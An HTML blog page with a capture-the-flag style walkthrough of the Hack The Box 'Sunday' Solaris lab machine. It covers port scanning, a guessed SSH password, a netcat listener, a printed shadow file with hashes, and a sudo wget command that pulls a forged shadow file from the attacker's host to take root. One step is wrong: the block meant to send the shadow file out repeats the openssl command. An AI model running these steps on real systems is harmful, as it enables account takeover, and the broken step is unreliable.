<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>nullarmor | Sunday - Hack The Box</title>
  <meta name="description" content="Resolution of the Sunday machine">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:title" content="Sunday - Hack The Box">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://nullarmor.github.io/posts/sunday">
  <meta property="og:description" content="Resolution of the Sunday machine">
  <meta property="og:site_name" content="nullarmor">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:url" content="https://nullarmor.github.io/posts/sunday">
  <meta name="twitter:title" content="Sunday - Hack The Box">
  <meta name="twitter:description" content="Resolution of the Sunday machine">
  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />

  
    
      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/sunday/sunday-00-8fa5de8db1c46e6f1b5ea310e4e54f2716f0850ded57351543e258d5070beec6.png">
      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/sunday/sunday-00-8fa5de8db1c46e6f1b5ea310e4e54f2716f0850ded57351543e258d5070beec6.png">
    
  

  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />

  

  

    
      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
    

  

</head>

<body>
  <main>
    <div class="grid grid-centered">
      <div class="grid-cell">
        <nav class="header-nav scrollappear">
  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
  <ul class="header-links">
    
      <li>
        <a href="/about" title="About me">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
</svg>

        </a>
      </li>
    
    
      <li>
        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
</svg>

        </a>
      </li>
    
    
    
    
      <li>
        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
      <li>
        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
    
    
    
    
    
    
      <li>
        <a href="mailto:nullarmor@protonmail.com" title="Email">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
</svg>

        </a>
      </li>
    
    
    
      <li>
        <a onclick="toggle()" title="Toggle Theme">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
</svg>

        </a>
      </li>
    
  </ul>
</nav>


  <ul class="header-tags scrollappear">
    
    
      
        <li><a href="/tag/ctf">Ctf</a></li>
    
      
        <li><a href="/tag/cybrics">Cybrics</a></li>
    
      
        <li><a href="/tag/hackthebox">Hackthebox</a></li>
    
      
        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
    
      
        <li><a href="/tag/pwn">Pwn</a></li>
    
      
        <li><a href="/tag/rev">Rev</a></li>
    
      
        <li><a href="/tag/rgbctf">Rgbctf</a></li>
    
      
        <li><a href="/tag/web">Web</a></li>
    
  </ul>


        <article class="article scrollappear">
          <header class="article-header">
            <h1>Sunday - Hack The Box</h1>
            <p>Resolution of the Sunday machine</p>
            <div class="article-list-footer">
  <span class="article-list-date">
    July 6, 2020
  </span>
  <span class="article-list-divider">-</span>
  <span class="article-list-minutes">
    
    
      3 minute read
    
  </span>
  <span class="article-list-divider">-</span>
  <div class="article-list-tags">
    
      
      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
    
  </div>
</div>
          </header>

          <div class="article-content">
            <p><a href="/assets/hackthebox/sunday/sunday-00-8fa5de8db1c46e6f1b5ea310e4e54f2716f0850ded57351543e258d5070beec6.png">
  <img src="/assets/hackthebox/sunday/sunday-00-8fa5de8db1c46e6f1b5ea310e4e54f2716f0850ded57351543e258d5070beec6.png" alt="Sunday banner" class="zooming" data-rjs="/assets/hackthebox/sunday/sunday-00-8fa5de8db1c46e6f1b5ea310e4e54f2716f0850ded57351543e258d5070beec6.png" data-zooming-width="597" data-zooming-height="380" />
</a></p>

<p>Sunday is an easy level machine based on Solaris, the initial approach is based on <code class="highlighter-rouge">guessing</code> to authenticate through SSH.
The privilege escalation has two steps: the first one is necessary <code class="highlighter-rouge">bruteforce</code> in order to get the sammy’s password and the second one we need to <code class="highlighter-rouge">overwrite the shadow file</code> using wget.</p>

<h1 id="recon">Recon</h1>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.80 scan initiated Mon Jul  6 06:49:18 2020 as: nmap -sC -sV -oA sunday -p- -T5 --min-parallelism=50 -n --min-rate=300 10.10.10.76</span>
Warning: 10.10.10.76 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>10.10.10.76
Host is up <span class="o">(</span>0.23s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 42922 filtered ports, 22608 closed ports
PORT      STATE SERVICE VERSION
79/tcp    open  finger  Sun Solaris fingerd
| finger: Login       Name               TTY         Idle    When    Where<span class="se">\x</span>0D
|_sunny    sunny                 pts/2            Mon 10:04  10.10.14.26         <span class="se">\x</span>0D
111/tcp   open  rpcbind
22022/tcp open  ssh     SunSSH 1.3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e <span class="o">(</span>DSA<span class="o">)</span>
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac <span class="o">(</span>RSA<span class="o">)</span>
44271/tcp open  unknown
60760/tcp open  unknown
Service Info: OS: Solaris<span class="p">;</span> CPE: cpe:/o:sun:sunos

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Mon Jul  6 06:59:57 2020 -- 1 IP address (1 host up) scanned in 638.43 seconds</span></code></pre></figure>

<p>The finger service returned one user, named <code class="highlighter-rouge">sunny</code>.</p>

<p>After a while guessing some credentials to the SSH service, we found that <code class="highlighter-rouge">sunny:sunday</code> worked!</p>

<figure class="highlight"><pre><code class="language-ssh" data-lang="ssh">ssh sunny@10.10.10.76 -p22022 -oKexAlgorithms=+diffie-hellman-group1-sha1</code></pre></figure>

<p>Now we’re logged as sunny user!</p>

<p><a href="/assets/hackthebox/sunday/sunday-01-226545dcbce5f00a2f5f12be7e2e995ffffe50a5b419dc8f7b45f564f7892237.png">
  <img src="/assets/hackthebox/sunday/sunday-01-226545dcbce5f00a2f5f12be7e2e995ffffe50a5b419dc8f7b45f564f7892237.png" alt="Sunday Recon" class="zooming" data-rjs="/assets/hackthebox/sunday/sunday-01-226545dcbce5f00a2f5f12be7e2e995ffffe50a5b419dc8f7b45f564f7892237.png" data-zooming-width="594" data-zooming-height="106" />
</a></p>

<h1 id="post-exploitation---breaking-the-shadow-passwords--overwriting-the-shadow-with-wget">Post Exploitation - Breaking the shadow passwords &amp; Overwriting the shadow with wget</h1>

<p>After a new recon, we found an interesting binary permission with <code class="highlighter-rouge">sudo -l</code> command:</p>

<p><a href="/assets/hackthebox/sunday/sunday-02-dc53295046031ed77a63639cb80fc706581ceeadf8de2ccbd357528f5a7aac86.png">
  <img src="/assets/hackthebox/sunday/sunday-02-dc53295046031ed77a63639cb80fc706581ceeadf8de2ccbd357528f5a7aac86.png" alt="Sunday Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/sunday/sunday-02-dc53295046031ed77a63639cb80fc706581ceeadf8de2ccbd357528f5a7aac86.png" data-zooming-width="408" data-zooming-height="66" />
</a></p>

<p>With wget we can overwrite the shadow file using wget that will be running as root, to do it we need to get the shadow’s content (only available to superusers) and transfer to our machine, after that we need to generate another password for the root account.</p>

<p>Let’s generate another password using <code class="highlighter-rouge">openssl</code>:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> root nullarmor</code></pre></figure>

<p>After that we dump the shadow’s content using wget to transfer to our machine:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> root nullarmor</code></pre></figure>

<p>To receive the content:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">nc <span class="nt">-lvp</span> 4444</code></pre></figure>

<p>Now we need to replace the old root’s password with the new one:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">root:<span class="nv">$1$root$QAGfQ4UF</span>.2JcR/QRdATrs.:14146::::::
daemon:NP:6445::::::
bin:NP:6445::::::
sys:NP:6445::::::
adm:NP:6445::::::
lp:NP:6445::::::
uucp:NP:6445::::::
nuucp:NP:6445::::::
dladm:<span class="k">*</span>LK<span class="k">*</span>:::::::
smmsp:NP:6445::::::
listen:<span class="k">*</span>LK<span class="k">*</span>:::::::
gdm:<span class="k">*</span>LK<span class="k">*</span>:::::::
zfssnap:NP:::::::
xvm:<span class="k">*</span>LK<span class="k">*</span>:6445::::::
mysql:NP:::::::
openldap:<span class="k">*</span>LK<span class="k">*</span>:::::::
webservd:<span class="k">*</span>LK<span class="k">*</span>:::::::
postgres:NP:::::::
svctag:<span class="k">*</span>LK<span class="k">*</span>:6445::::::
nobody:<span class="k">*</span>LK<span class="k">*</span>:6445::::::
noaccess:<span class="k">*</span>LK<span class="k">*</span>:6445::::::
nobody4:<span class="k">*</span>LK<span class="k">*</span>:6445::::::
sammy:<span class="nv">$5$Ebkn8jlK$i6SSPa0</span>.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:<span class="nv">$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3</span>:17636::::::
root2:z4h3ad8EMb53c</code></pre></figure>

<p>In our machine, we set up a file server using <code class="highlighter-rouge">SimpleHTTPServer</code>, a Python module:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python <span class="nt">-m</span> SimpleHTTPServer 8000</code></pre></figure>

<p>Following to the final step, we need to download the modified shadow file from our web server and replace it:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">sudo</span> /usr/bin/wget http://10.10.14.26:8000/shadow <span class="nt">-O</span> /etc/shadow</code></pre></figure>

<p>Done, we changed the root’s password and now we’re able to capture the last flag!</p>

<p><a href="/assets/hackthebox/sunday/sunday-03-2e4129d58bd1aa2a69df939e5bde427be5afed6abc9bc2ed15f28ff914bbbc90.png">
  <img src="/assets/hackthebox/sunday/sunday-03-2e4129d58bd1aa2a69df939e5bde427be5afed6abc9bc2ed15f28ff914bbbc90.png" alt="Sunday Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/sunday/sunday-03-2e4129d58bd1aa2a69df939e5bde427be5afed6abc9bc2ed15f28ff914bbbc90.png" data-zooming-width="331" data-zooming-height="86" />
</a></p>

          </div>
          <div class="article-share">
            
            
            <a href="https://twitter.com/home?status=Sunday+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/sunday%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
            </a>
            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/sunday" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
            </a>
          </div>

          
            <div id="disqus_thread" class="article-comments"></div>
            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
            <noscript>Please enable JavaScript to view the comments.</noscript>
          
        </article>
        <footer class="footer scrollappear">
  <p>
    This site uses Chalk theme made by Nielsen Ramon.
  </p>
</footer>

      </div>
    </div>
  </main>
  
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'UA-159304176-1');
  </script>


<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>


  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>



  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>


<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>


  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>

</body>
</html>
